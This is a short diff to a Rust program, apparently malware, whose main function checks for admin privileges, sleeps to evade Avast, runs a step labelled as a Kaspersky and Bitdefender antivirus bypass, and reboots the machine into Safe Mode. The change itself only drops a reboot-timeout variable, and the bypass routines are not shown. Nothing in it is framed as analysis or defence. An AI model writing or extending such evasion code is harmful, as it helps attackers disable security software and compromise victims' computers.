@@ -233,14 +233,10 @@ fn main() {
 
     println!("Admin privileges confirmed.");
 
-    // Variable to store reboot timeout
-    let mut reboot_timeout = 7;
-
     // Step 2: Check for Avast Installation
     if check_avast_installed() {
         println!("Avast detected. Sleeping for 65 seconds...");
-        thread::sleep(time::Duration::from_secs(65)); // Sleep for 60 seconds
-        reboot_timeout = 10; // Set reboot timeout to 10 if Avast is detected
+        thread::sleep(time::Duration::from_secs(65));  // Sleep for 60 seconds
     }
 
     // Step 3: Kaspersky, Bitdefender bypass (General Antivirus bypass)
@@ -274,7 +270,7 @@ fn main() {
     }
 
     // Step 8: Reboot the system to Safe Mode if needed
-    if let Err(e) = reboot_system(Some(reboot_timeout)) {
+    if let Err(e) = reboot_system() {
         eprintln!("Error rebooting system: {}", e);
     }
 
